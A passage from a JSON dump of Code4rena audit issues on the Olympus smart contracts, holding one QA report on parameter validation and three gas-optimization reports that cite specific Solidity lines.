"https://github.com/code-423n4/2022-08-olympus-findings/issues/27", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "- **Finding**: Constructor parameter are not validated     **Severity:** QA     **Description:**     Constructor parameters are not validated at:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L77     To mitigate the risk of misconfiguration, it's recommended to validate `tokens_` and `rangeParams_` parameters     (the former is used to set immutable variables, which cannot be modified after being set incorrectly in constructor).  - **Finding**: Misconfiguration risk due to usage of arrays to pass function arguments     **Severity:** QA     **Description:**     The usage of arrays when passing multiple arguments to functions can cause misconfiguration issues because deployer/     user has to ensure the order of array elements is correct when calling a function. It's recommended to use parameters     structures in these cases:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L79-L80         For `tokens_` and `rangeParams_`. Passing tokens in a wrong order might result in an unusable contract.     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L96-L97         For `tokens_` and `configParams`. Passing tokens in a wrong order might result in an unusable contract. `configParams` contains many values that are hard to read/track in the code since they're referenced by their index in the array, not their name.      Poor readability of array arguments forced developers to add the comments with argument names and their order.      An example of a parameters structure:     - https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L128     - https://github.com/Uniswap/v3-periphery/blob/75f3b72b4412b41e31c2a2370bb52d55f99ec717/contracts/interfaces/INonfungiblePositionManager.sol#L79-L91  - **Finding**: Poor validation of \"debt buffer\" arguments     **Severity:** QA     **Description:**     These function arguments are not validated according to the documentation:     - `cushionDebtBuffer` at https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97     - `debtBuffer_` at https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527          In both of these cases, the passed value is checked to be lower than `10000`, however, in [MarketParams     documentation in IBondAuctioneer](https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondAuctioneer.sol#L31-L35):     > Minimum is the greater of 10% or initial max payout as a percentage of capacity.     > The value must be > 10% but can exceed 100% if desired.      Also, the documentation says:     > If the value is too small, the market will not be able function normally and close prematurely.      However, there's no minimal value check in the above functions.  - **Finding**: Unused function     **Severity:** QA     **Description:**     `fromRole` in `KernelUtils.sol` is not used:     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L26"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/24", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "-> X = X + Y IS CHEAPER THAN X += Y (same for X = X - Y IS CHEAPER THAN X -= Y)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=reserveDebt%5Btoken_%5D%5Bmsg.sender%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=reserveDebt%5Btoken_%5D%5Bmsg.sender%5D%20%2D%3D%20received%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2D%3D%20received%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=oldDebt%20%3C%20amount_)-,totalDebt%5Btoken_%5D%20%2B%3D%20amount_,-%2D%20oldDebt%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=totalDebt%5Btoken_%5D%20%2D%3D%20oldDebt https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_movingAverage%20%2B%3D%20(currentPrice%20%2D%20earliestPrice)%20/%20numObs%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_movingAverage%20%2D%3D%20(earliestPrice%20%2D%20currentPrice)%20/%20numObs%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=total%20%2B%3D%20startObservations_%5Bi%5D%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#:~:text=balanceOf%5Bfrom_%5D%20%2D%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#:~:text=balanceOf%5Bto_%5D%20%2B%3D%20amount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=_amountsPerMarket%5Bid_%5D%5B0%5D%20%2B%3D%20inputAmount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=_amountsPerMarket%5Bid_%5D%5B1%5D%20%2B%3D%20outputAmount_%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#:~:text=lastBeat%20%2B%3D%20frequency()%3B   ->STATE VARIABLES ONLY SET IN THE CONSTRUCTOR SHOULD BE DECLARED IMMUTABLE  Avoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a PUSH32 (3 gas)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=uint256%20internal%20immutable%20_scaleFactor%3B  -> ++i costs less gas compared to i++ or i += 1 (Also --i costs less gas compared to i-- or i -= 1)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=A%2DZ%20only-,unchecked%20%7B,i%2B%2B%3B,-%7D https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=%7D-,unchecked%20%7B,i%2B%2B%3B,-%7D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=/%2010%3B-,decimals%2B%2B,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%20true%3B-,_status.low.count%2B%2B,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%20false%3B-,_status.low.count%2D%2D,-%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_status.high.count%2B%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_status.high.count%2D%2D   -> USAGE OF UINTS/INTS SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=%3D%3E%20mapping(-,bytes4,-%3D%3E%20bool))) https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=)%20pure%20returns-,(bytes5),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=override%20returns%20(-,uint8%20major%2C,-uint8%20minor)%20%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#:~:text=uint8%20major%2C-,uint8%20minor),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=by%20the%20contract.-,uint8,-public%20constant%20decimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=_ohmEthPriceFeed%20%3D%20ohmEthPriceFeed_%3B-,uint8,-ohmEthDecimals%20%3D%20_ohmEthPriceFeed https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#:~:text=override%20returns%20(-,uint8%20major,-%2C%20uint8%20minor https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#:~:text=uint8%20major%2C-,uint8%20minor),-%7B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=public%20immutable%20ohm%3B-,uint8,-public%20immutable%20ohmDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=public%20immutable%20reserve%3B-,uint8,-public%20immutable%20reserveDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=is%20the%20priceDecimal%20value-,int8,-priceDecimals%20%3D%20_getPriceDecimals(range https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=cushion.high.price)%3B-,int8,-scaleAdjustment%20%3D%20int8 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=int8%20scaleAdjustment%20%3D-,int8,-(ohmDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(ohmDecimals)%20%2D-,int8,-(reserveDecimals)%20%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=uint256%20bondScale%20%3D%2010%20**-,uint8(,-36%20%2B%20scaleAdjustment%20%2B%20int8(reserveDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=the%20low%20side-,uint8,-oracleDecimals%20%3D%20PRICE https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=is%20the%20priceDecimal%20value-,int8,-priceDecimals%20%3D%20_getPriceDecimals(invCushionPrice https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=_getPriceDecimals(invCushionPrice)%3B-,int8,-scaleAdjustment%20%3D%20int8 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=int8%20scaleAdjustment%20%3D-,int8,-(reserveDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(reserveDecimals)%20%2D-,int8,-(ohmDecimals)%20%2B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%3D%2010**-,uint8,-(int8(oracleDecimals https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=**uint8(-,int8,-(oracleDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=%2B%20scaleAdjustment%20%2B-,int8,-(ohmDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=(ohmDecimals)%20%2D-,int8,-(reserveDecimals)%20%2D https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=return%20decimals%20%2D-,int8,-(PRICE.decimals   ->IT COSTS MORE GAS TO INITIALIZE NON-CONSTANT/NON-IMMUTABLE VARIABLES TO ZERO THAN TO LET THE DEFAULT OF ZERO BE APPLIED  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=for%20(-,uint256%20i%20%3D%200%3B,-i%20%3C%205 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#:~:text=for-,(uint256%20i%20%3D%200,-%3B%20i%20%3C%2032   ->USING BOOLS FOR STORAGE INCURS OVERHEAD  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=mapping(bytes4%20%3D%3E%20bool))) https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=mapping(Role%20%3D%3E%20bool)) https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#:~:text=if%20role%20exists.-,mapping(Role%20%3D%3E%20bool),-public%20isRole%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#:~:text=and%20therefore%20active).-,bool,-public%20initialized%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=bool%20public%20initialized%3B https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#:~:text=Operator%20is%20active-,bool%20public%20active%3B,-///%20Modules https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#:~:text=mapping(uint256%20%3D%3E%20bool) https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#:~:text=stopped%2C%20true%20%3D%20beating-,bool%20public%20active%3B,-///%20%40notice%20Timestamp%20of https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#:~:text=mapping(address%20%3D%3E%20bool)  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "**Kernel.sol** - L70/88/119/223/229 - Gas can be saved if instead of using a modifier a private view function is used, this would reduce all the costs of validating the access control of an address.  - L397 - When you want to set a variable with its default value, it is less expensive not to set it since it has that default value, this reduces some gas units without losing understanding of the code.  **KernelUtils.sol** - L43/58 - When you want to set a variable with its default value, it is less expensive not to set it since it has that default value, this reduces some gas units without losing understanding of the code.  - L49/64 - It is less expensive to do the ++i operation than to do i++, without losing understanding of the code.  **TRSRY.sol** - L131/132 - When previously it is validated that the operation returns a value without overflow/underflow, it can be wrapped with unchecked in order to spend less gas when performing the mathematical operation. What could be unchecked is the operation, not the validation of the if.  **PRICE.sol** - L6 - The ERC20 class is imported, but it is never used, this generates unnecessary extra gas costs.  - L136/138 - When it is previously validated that the operation returns a value without overflow/underflow, it can be wrapped with unchecked in order to spend less gas when performing the mathematical operation. What could be unchecked is the operation, not the validation of the if.  **BondCallback.sol** - L120 - It is necessary to validate that outputAmount_ > inputAmount_ so that it does not throw an exception without any underflow message. In addition, the outputAmount_ - inputAmount_ operation can become unchecked so that what has already been validated is not validated.  - L223/306 - Instead of validating \"validation == true\" or \"validation == false\" it is much simpler and less expensive to validate \"validation\" or \"!validation\".  - L278 - In a for loop instead of consulting the length of the array to be iterated in each iteration, the least expensive thing is to create a variable in memory of the value of array.length  **RANGE.sol** - L133/145 - It is less expensive in a validation that the less expensive operation is ahead, since it avoids executing the second more expensive validation.  **Heart.sun** - L26 - an error is created that is not used anywhere, it should be eliminated.   **TreasuryCustodian.sol** - L11 - an error is created that is not used anywhere, it should be eliminated.   **Operator.sol** - L188 - The modifier can generate much less gas cost, if instead of a modifier it were a private view function.  - L488/670/675 - It is less expensive to make ++variable than to make variable++, without modifying the understanding of the code. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# [G-01] **tate variables only set in the constructor should be declared `immutable`** (Avoids a Gsset (20000 gas)):    1. File: 2022-08-olympus/src/Kernel.sol (line 155-158):     `    address public executor;      /// @notice Address that is responsible for assigning policy-defined roles to addresses.     address public admin;`  2. File: 2022-08-olympus/src/Kernel.sol (line 188):     `Policy[] public activePolicies;`  3. File: 2022-08-olympus/src/modules/PRICE.sol (line 41-56):     `    uint256[] public observations;      /// @notice Index of the next observation to make. The current value at this index is the oldest observation.     uint32 public nextObsIndex;      /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.     uint32 public numObservations;      /// @notice Frequency (in seconds) that observations should be stored.     uint48 public observationFrequency;      /// @notice Duration (in seconds) over which the moving average is calculated.     uint48 public movingAverageDuration;      /// @notice Unix timestamp of last observation (in seconds).     uint48 public lastObservationTime;`  4. File: 2022-08-olympus/src/modules/INSTR.sol (line 13):     `uint256 public totalInstructions;`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 76-78):     `   IBondAuctioneer public auctioneer;     /// @notice     Callback contract used for cushion bond market payouts     IBondCallback public callback;`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 28-32):     `    IBondAggregator public aggregator;     OlympusTreasury public TRSRY;     OlympusMinter public MINTR;     Operator public operator;     ERC20 public ohm;`  7. File: 2022-08-olympus/src/policies/Heart.sol (line 36-42):     `    uint256 public lastBeat;      /// @notice Reward for beating the Heart (in reward token decimals)     uint256 public reward;      /// @notice Reward token address that users are sent for beating the Heart     ERC20 public rewardToken;`      8. File: 2022-08-olympus/src/policies/VoterRegistration.sol (line 10):     `OlympusVotes public VOTES;`          # [G-02] `x = x + y` is cheaper than `x += y`:    1. File: 2022-08-olympus/src/modules/TRSRY.sol (line 115-116):     `        reserveDebt[token_][msg.sender] -= received;         totalDebt[token_] -= received;`  2. File: 2022-08-olympus/src/modules/TRSRY.sol (line 132):     `else totalDebt[token_] -= oldDebt - amount_;`  3. File: 2022-08-olympus/src/modules/PRICE.sol (line 138):     `_movingAverage -= (earliestPrice - currentPrice) / numObs;`  4. File: 2022-08-olympus/src/modules/VOTES.sol (line 56):     `balanceOf[from_] -= amount_;`         5. File: 2022-08-olympus/src/policies/Governance.sol (line 194):     `totalEndorsementsForProposal[proposalId_] -= previousEndorsement;`  6. File: 2022-08-olympus/src/policies/BondCallback.sol (line 28-32):     `    IBondAggregator public aggregator;     OlympusTreasury public TRSRY;     OlympusMinter public MINTR;     Operator public operator;     ERC20 public ohm;`  7. File: 2022-08-olympus/src/modules/TRSRY.sol (line 96-97):     `        reserveDebt[token_][msg.sender] += amount_;         totalDebt[token_] += amount_;`  8. File: 2022-08-olympus/src/modules/TRSRY.sol (line 131):     `if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;`   9. File: 2022-08-olympus/src/modules/PRICE.sol (line 136):     `_movingAverage += (currentPrice - earliestPrice) / numObs;`  10. File: 2022-08-olympus/src/modules/PRICE.sol (line 222):     `total += startObservations_[i];`   11. File: 2022-08-olympus/src/modules/VOTES.sol (line 58):     `balanceOf[to_] += amount_;`  12. File: 2022-08-olympus/src/policies/BondCallback.sol (line 143-144):     `        _amountsPerMarket[id_][0] += inputAmount_;         _amountsPerMarket[id_][1] += outputAmount_;`  13. File: 2022-08-olympus/src/policies/Heart.sol (line 103):     `lastBeat += frequency();`   14. File: 2022-08-olympus/src/policies/Governance.sol (line 198):     `totalEndorsementsForProposal[proposalId_] += userVotes;`  15. File: 2022-08-olympus/src/policies/Governance.sol 252-254):     `            yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;`                                                # [G-03] `<array>.length` should not be looked up in every loop of a `for` loop:    1. File: 2022-08-olympus/src/policies/Governance.sol (line 278):     `for (uint256 step; step < instructions.length; ) {`               # [G-04] Not using the named return variables when a function returns, wastes deployment gas:    1. File: 2022-08-olympus/src/modules/RANGE.sol (line 276):     `return _range;`  2. File: 2022-08-olympus/src/policies/Operator.sol (line 784):     `return _status;`  3. File: 2022-08-olympus/src/policies/Operator.sol (line 799):     ` return _config;`         # [G-05] It costs more gas to initialize variables to zero than to let the default of zero be applied:    1. File: 2022-08-olympus/src/Kernel.sol (line 276):     `for (uint256 i = 0; i < reqLength; ) {`  2. File: 2022-08-olympus/src/utils/KernelUtils.sol (line 58):     `for (uint256 i = 0; i < 32; ) {`  3. File: 2022-08-olympus/src/utils/KernelUtils.sol (line 43):     `for (uint256 i = 0; i < 5; ) {`  4. File: 2022-08-olympus/src/modules/PRICE.sol (line 253-255):     `        lastObservationTime = 0;         _movingAverage = 0;         nextObsIndex = 0;`         5. File: 2022-08-olympus/src/modules/PRICE.sol (line 285-287):     `        lastObservationTime = 0;         _movingAverage = 0;         nextObsIndex = 0;`  6. File: 2022-08-olympus/src/policies/Operator.sol(line 574-575):     `        _status.high.count = 0;         _status.high.nextObservation = 0;`   7. File: 2022-08-olympus/src/policies/Operator.sol (line 578-579):     `        _status.low.count = 0;         _status.low.nextObservation = 0;`           # [G-06] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead (> When using elements that are smaller than 32 bytes, your  contract\u2019s gas usage may be higher. This is because the EVM operates on  32 bytes at a time. Therefore, if the element is smaller than that, the  EVM must use more operations in order to reduce the size of the element  from 32 bytes to the desired size. >   [https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html) Use a larger size then downcast where needed):    1. File: 2022-08-olympus/src/Kernel.sol (line 100):     `function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}`  2. File: 2022-08-olympus/src/modules/TRSRY.sol (line 51):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  3. File: 2022-08-olympus/src/modules/MINTR.sol (line 25):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  4. File: 2022-08-olympus/src/modules/RANGE.sol (line 45):     `uint48 lastActive;`         5. File: 2022-08-olympus/src/modules/RANGE.sol (line 115):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  6. File: 2022-08-olympus/src/modules/RANGE.sol(line 136):     `_range.high.lastActive = uint48(block.timestamp);`   7. File: 2022-08-olympus/src/modules/RANGE.sol (line 148):     `_range.low.lastActive = uint48(block.timestamp);`      8. File: 2022-08-olympus/src/modules/PRICE.sol (line 27-28):     `    event MovingAverageDurationChanged(uint48 movingAverageDuration_);     event ObservationFrequencyChanged(uint48 observationFrequency_);`         9. File: 2022-08-olympus/src/modules/PRICE.sol (line 44-59):     ` uint32 public nextObsIndex;      /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.     uint32 public numObservations;      /// @notice Frequency (in seconds) that observations should be stored.     uint48 public observationFrequency;      /// @notice Duration (in seconds) over which the moving average is calculated.     uint48 public movingAverageDuration;      /// @notice Unix timestamp of last observation (in seconds).     uint48 public lastObservationTime;      /// @notice Number of decimals in the price values provided by the contract.     uint8 public constant decimals = 18;`  10. File: 2022-08-olympus/src/policies/Operator.sol(line 75-76):     `        uint48 observationFrequency_,         uint48 movingAverageDuration_`   11. File: 2022-08-olympus/src/policies/Operator.sol (line 84):     `uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals();`  12. File: 2022-08-olympus/src/modules/PRICE.sol (line 87):     `uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals();`  13. File: 2022-08-olympus/src/modules/PRICE.sol (line 97):     `numObservations = uint32(movingAverageDuration_ / observationFrequency_);`  14. File: 2022-08-olympus/src/modules/PRICE.sol (line 113):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`   15. File: 2022-08-olympus/src/modules/PRICE.sol (line 127):     `uint32 numObs = numObservations;`  16. File: 2022-08-olympus/src/modules/PRICE.sol (line 143):     `lastObservationTime = uint48(block.timestamp);`    17. File: 2022-08-olympus/src/modules/PRICE.sol (line 185):     `uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;`  18. File: 2022-08-olympus/src/modules/PRICE.sol (line 215):     `if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))`  19. File: 2022-08-olympus/src/modules/PRICE.sol (line 240):     `function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned {`  20. File: 2022-08-olympus/src/modules/PRICE.sol (line 257):     `numObservations = uint32(newObservations);`  21. File: 2022-08-olympus/src/modules/PRICE.sol (line 266):     `function changeObservationFrequency(uint48 observationFrequency_) external permissioned {`  22. File: 2022-08-olympus/src/modules/PRICE.sol (line 289):     `numObservations = uint32(newObservations);`  23. 2022-08-olympus/src/modules/VOTES.sol (line 27):     `function VERSION() external pure override returns (uint8 major, uint8 minor) {`  24. 2022-08-olympus/src/modules/INSTR.sol (line 28):     `function VERSION() public pure override returns (uint8 major, uint8 minor) {`  25. 2022-08-olympus/src/policies/Operator.sol (line 51-54):     `    event CushionFactorChanged(uint32 cushionFactor_);     event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_);     event ReserveFactorChanged(uint32 reserveFactor_);     event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_);`  26. 2022-08-olympus/src/policies/Operator.sol (line 83):     `uint8 public immutable ohmDecimals;`  27. 2022-08-olympus/src/policies/Operator.sol (line 86-89):     `    uint8 public immutable reserveDecimals;      /// Constants     uint32 public constant FACTOR_SCALE = 1e4;`  28. 2022-08-olympus/src/policies/Operator.sol (line 51-54):     `uint32[8] memory configParams`  29. 2022-08-olympus/src/policies/Operator.sol (line 106-108):     `        if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();          if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])`  30. 2022-08-olympus/src/policies/Operator.sol (line 116):     `configParams[7] == uint32(0)`  31. 2022-08-olympus/src/policies/Operator.sol (line 127-129):     `            count: uint32(0),             lastRegen: uint48(block.timestamp),             nextObservation: uint32(0),`  32. 2022-08-olympus/src/policies/Operator.sol (line 210):     `uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&`  33. 2022-08-olympus/src/policies/Operator.sol (line 216):     `uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&`  34. 2022-08-olympus/src/policies/Operator.sol (line 403-404):     `                vesting: uint48(0), // Instant swaps                 conclusion: uint48(block.timestamp + config_.cushionDuration),`  35. 2022-08-olympus/src/policies/Operator.sol (line 418):     `uint8 oracleDecimals = PRICE.decimals();`  36. 2022-08-olympus/src/policies/Operator.sol (line 455-456):     `                vesting: uint48(0), // Instant swaps                 conclusion: uint48(block.timestamp + config_.cushionDuration),`   37. 2022-08-olympus/src/policies/Operator.sol (line 516):     `function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {`  38. 2022-08-olympus/src/policies/Operator.sol (line 528-530):     `        uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_`   39. 2022-08-olympus/src/policies/Operator.sol (line 535-536):     `        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();         if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)`  40. 2022-08-olympus/src/policies/Operator.sol (line 548):     `function setReserveFactor(uint32 reserveFactor_) external onlyRole(\"operator_policy\") {`  41. 2022-08-olympus/src/policies/Operator.sol (line 560-562):     `        uint32 wait_,         uint32 threshold_,         uint32 observe_`  42. 2022-08-olympus/src/policies/Operator.sol (line 665):     `uint32 observe = _config.regenObserve;`  43. 2022-08-olympus/src/policies/Operator.sol (line 560-562):     `        uint32 wait_,         uint32 threshold_,         uint32 observe_`  44. 2022-08-olympus/src/policies/Operator.sol (line 705):     `_status.high.count = uint32(0);`   45. 2022-08-olympus/src/policies/Operator.sol (line 707-708):     `            _status.high.nextObservation = uint32(0);             _status.high.lastRegen = uint48(block.timestamp);`  46. 2022-08-olympus/src/policies/Operator.sol (line 717):     `_status.low.count = uint32(0);`   47. 2022-08-olympus/src/policies/Operator.sol (line 719-720):     `            _status.low.nextObservation = uint32(0);             _status.low.lastRegen = uint48(block.timestamp);`   48. 2022-08-olympus/src/policies/PriceConfig.sol (line 58):     `function changeMovingAverageDuration(uint48 movingAverageDuration_)`   49. 2022-08-olympus/src/policies/PriceConfig.sol (line 69):     `function changeObservationFrequency(uint48 observationFrequency_)`  50. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 13-20):     `        uint32 cushionFactor; // percent of capacity to be used for a single cushion deployment, assumes 2 decimals (i.e. 1000 = 10%)         uint32 cushionDuration; // duration of a single cushion deployment in seconds         uint32 cushionDebtBuffer; // Percentage over the initial debt to allow the market to accumulate at any one time. Percent with 3 decimals, e.g. 1_000 = 1 %. See IBondAuctioneer for more info.         uint32 cushionDepositInterval; // Target frequency of deposits. Determines max payout of the bond market. See IBondAuctioneer for more info.         uint32 reserveFactor; // percent of reserves in treasury to be used for a single wall, assumes 2 decimals (i.e. 1000 = 10%)         uint32 regenWait; // minimum duration to wait to reinstate a wall in seconds         uint32 regenThreshold; // number of price points on other side of moving average to reinstate a wall         uint32 regenObserve; // number of price points to observe to determine regeneration`   51. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 31-33):     `        uint32 count; // current number of price points that count towards regeneration         uint48 lastRegen; // timestamp of the last regeneration         uint32 nextObservation; // index of the next observation in the observations array`  52. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 93-95):     `       uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_`   53. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 101):     `function setReserveFactor(uint32 reserveFactor_) external;`   54. 2022-08-olympus/src/policies/interfaces/IOperator.sol (line 110-112):     `       uint32 wait_,         uint32 threshold_,         uint32 observe_`                                                                                                                                              # [G-06] Functions guaranteed to revert when called by normal users can be marked `payable` (If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.):    1. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 42-46):     `   function grantApproval(         address for_,         ERC20 token_,         uint256 amount_     ) external onlyRole(\"custodian\") {`  2. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 71-75):     `    function increaseDebt(         ERC20 token_,         address debtor_,         uint256 amount_     ) external onlyRole(\"custodian\") {`  3. File: 2022-08-olympus/src/policies/TreasuryCustodian.sol (line 80-85):     `    function decreaseDebt(         ERC20 token_,         address debtor_,         uint256 amount_     ) external onlyRole(\"custodian\") {`  4. File: 2022-08-olympus/src/policies/Operator.sol (line 195):     `function operate() external override onlyWhileActive onlyRole(\"operator_operate\") {`         5. File: 2022-08-olympus/src/policies/Operator.sol (line 346-350):     `function bondPurchase(uint256 id_, uint256 amountOut_)         external         onlyWhileActive         onlyRole(\"operator_reporter\")     {`  6. File: 2022-08-olympus/src/policies/Operator.sol(line 498-624):     `     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_)         external         onlyRole(\"operator_policy\")     {         /// Set spreads on the range module         RANGE.setSpreads(cushionSpread_, wallSpread_);          /// Update range prices (wall and cushion)         _updateRangePrices();     }      /// @inheritdoc IOperator     function setThresholdFactor(uint256 thresholdFactor_) external 